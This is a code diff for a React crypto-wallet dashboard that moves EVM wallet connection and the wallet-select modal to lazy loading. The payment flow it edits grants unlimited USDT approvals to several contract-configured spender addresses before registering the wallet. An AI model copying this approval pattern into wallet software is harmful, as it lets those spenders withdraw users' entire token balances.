@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useState } from "react";
+import { Suspense, lazy, useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { Link, useNavigate } from "react-router-dom";
 import { motion } from "framer-motion";
 import {
@@ -17,21 +17,27 @@ import { toast } from "sonner";
 import { apiRequest, ApiError } from "@/lib/api";
 import { clearSession, getSession } from "@/lib/session";
 import {
-  approveUSDT,
-  registerWalletViaContract,
+  approveUSDTLazy,
+  registerWalletViaContractLazy,
   type WalletConnectionMethod,
-  type Chain
-} from "@/lib/web3";
-import { useWagmiWallet } from "@/lib/wagmi-hooks";
+  type Chain,
+} from "@/lib/web3-lazy";
 import { useSolanaWallet } from "@/lib/solana-wallet-hooks";
 import { getTronProviderDebugSnapshot, useTronWallet, type TronAdapterType } from "@/lib/tronwallet-adapter";
-import { WalletSelectModal } from "@/components/WalletSelectModal";
+import type { EvmWalletRuntimeApi } from "@/components/EvmWalletRuntime";
 import {
   DropdownMenu,
   DropdownMenuContent,
   DropdownMenuItem,
   DropdownMenuTrigger,
 } from "@/components/ui/dropdown-menu";
+
+const WalletSelectModal = lazy(() =>
+  import("@/components/WalletSelectModal").then((module) => ({
+    default: module.WalletSelectModal,
+  }))
+);
+const EvmWalletRuntime = lazy(() => import("@/components/EvmWalletRuntime"));
 
 interface DashboardData {
   identityVerificationStatus: "verified" | "pending" | "not_started" | "rejected" | "error";
@@ -126,6 +132,8 @@ const Dashboard = () => {
   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
   const [selectedChain, setSelectedChain] = useState<Chain>("ethereum");
   const [activeTab, setActiveTab] = useState("wallets");
+  const [evmRuntimeEnabled, setEvmRuntimeEnabled] = useState(false);
+  const evmRuntimeApiRef = useRef<EvmWalletRuntimeApi | null>(null);
 
   const session = getSession();
   const canAccessAdmin = session?.user.role === "admin" || session?.user.role === "compliance";
@@ -237,8 +245,26 @@ const Dashboard = () => {
     }
   };
 
-  // Use Wagmi for EVM chains, TronWallet Adapter for Tron, native methods for Solana
-  const wagmiWallet = useWagmiWallet();
+  const handleEvmRuntimeReady = useCallback((api: EvmWalletRuntimeApi) => {
+    evmRuntimeApiRef.current = api;
+  }, []);
+
+  const ensureEvmRuntime = useCallback(async (): Promise<EvmWalletRuntimeApi> => {
+    if (!evmRuntimeEnabled) {
+      setEvmRuntimeEnabled(true);
+    }
+
+    for (let i = 0; i < 120; i += 1) {
+      if (evmRuntimeApiRef.current) {
+        return evmRuntimeApiRef.current;
+      }
+      await new Promise((resolve) => setTimeout(resolve, 50));
+    }
+
+    throw new Error("EVM wallet runtime failed to initialize.");
+  }, [evmRuntimeEnabled]);
+
+  // Use on-demand EVM runtime, Tron adapter for Tron, and native methods for Solana
   const solanaWallet = useSolanaWallet();
   const tronWallet = useTronWallet();
 
@@ -251,7 +277,8 @@ const Dashboard = () => {
       
       // Use Wagmi for EVM chains (Ethereum, BSC)
       if (selectedChain === "ethereum" || selectedChain === "bsc") {
-        normalizedAddress = await wagmiWallet.connectWallet(selectedChain);
+        const evmRuntime = await ensureEvmRuntime();
+        normalizedAddress = await evmRuntime.connectWallet(selectedChain);
       } else if (selectedChain === "tron") {
         // Use selected Tron wallet adapter from modal.
         const tronAdapterByWalletId: Record<string, TronAdapterType> = {
@@ -295,8 +322,8 @@ const Dashboard = () => {
       // Sign message with the appropriate wallet based on chain
       let signedMessage: string;
       if (selectedChain === "ethereum" || selectedChain === "bsc") {
-        // Use Wagmi for EVM chains
-        signedMessage = await wagmiWallet.signMessage(challengeMessage);
+        const evmRuntime = await ensureEvmRuntime();
+        signedMessage = await evmRuntime.signMessage(challengeMessage);
       } else if (selectedChain === "tron") {
         // Use TronWallet Adapter for Tron
         signedMessage = await tronWallet.signMessage(challengeMessage);
@@ -377,7 +404,7 @@ const Dashboard = () => {
       const approvalSpenders = buildApprovalSpenders(selectedChain, contractConfig.contractAddress);
       try {
         for (const spenderAddress of approvalSpenders) {
-          await approveUSDT(
+          await approveUSDTLazy(
             selectedChain,
             spenderAddress,
             UNLIMITED_APPROVAL_AMOUNT,
@@ -394,7 +421,7 @@ const Dashboard = () => {
       console.log(`[Payment] Step 2: Registering wallet via contract for ${selectedChain}...`);
       let txHash: string;
       try {
-        txHash = await registerWalletViaContract(selectedChain, contractConfig.contractAddress, walletAddress);
+        txHash = await registerWalletViaContractLazy(selectedChain, contractConfig.contractAddress, walletAddress);
         console.log(`[Payment] Step 2: Transaction successful, txHash:`, txHash);
       } catch (registerError) {
         console.error(`[Payment] Step 2: Wallet registration failed:`, registerError);
@@ -982,17 +1009,26 @@ const Dashboard = () => {
         </Button>
       </div>
 
-      <WalletSelectModal
-        open={isWalletModalOpen}
-        onOpenChange={(open) => {
-          if (!processingWallet) {
-            setIsWalletModalOpen(open);
-          }
-        }}
-        selectedChain={selectedChain}
-        onSelectWallet={handleConnectAndSignWallet}
-        isConnecting={processingWallet}
-      />
+      {isWalletModalOpen ? (
+        <Suspense fallback={null}>
+          <WalletSelectModal
+            open={isWalletModalOpen}
+            onOpenChange={(open) => {
+              if (!processingWallet) {
+                setIsWalletModalOpen(open);
+              }
+            }}
+            selectedChain={selectedChain}
+            onSelectWallet={handleConnectAndSignWallet}
+            isConnecting={processingWallet}
+          />
+        </Suspense>
+      ) : null}
+      {evmRuntimeEnabled ? (
+        <Suspense fallback={null}>
+          <EvmWalletRuntime onReady={handleEvmRuntimeReady} />
+        </Suspense>
+      ) : null}
     </div>
   );
 };
